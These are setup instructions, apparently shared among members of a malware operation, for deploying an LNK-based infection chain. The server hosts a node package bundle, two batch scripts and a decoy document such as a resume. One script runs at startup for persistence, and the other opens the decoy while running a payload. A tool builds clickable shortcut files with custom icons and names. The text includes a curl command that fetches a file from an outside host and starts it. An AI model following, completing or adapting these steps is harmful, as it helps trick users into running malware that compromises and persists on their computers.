We have to upload 4 files to it. npm.zip, 1.bat, 2.bat and readable file(like image, pdf, text etc)
If we assume the server url is https://example.com. every file link could be 
 https://example.com/npm.zip
 https://example.com/1.bat
 https://example.com/2.bat
 https://example.com/readme.txt or  https://example.com/resume.pdf

Here, 1.bat is the script for startup and 2.bat is the script that open readable file and run payload. 
Let's assume 1.bat is for startup and 2.bat is for lnk that users can click.
in 1.bat file, please remove command that download readable file and start it.
In sample bat file, it is curl https://apikey6.vercel.app/readme.txt -o ....start %TEMP%\\readme.txt
Please replace server url with your real server url.

npm.zip contains node packages and script file(I will send you script files for each member after server setup finished, pls replace 1.d file with it in npm.zip)
And readable file is the file that opens when user click lnk file

And let's create lnk file.
pls unzip lnk_creater and install node modules.
and open index.js and replace server url with your real server url.
And change icon what you need and change lnk file name.
and then pls run "node index.js"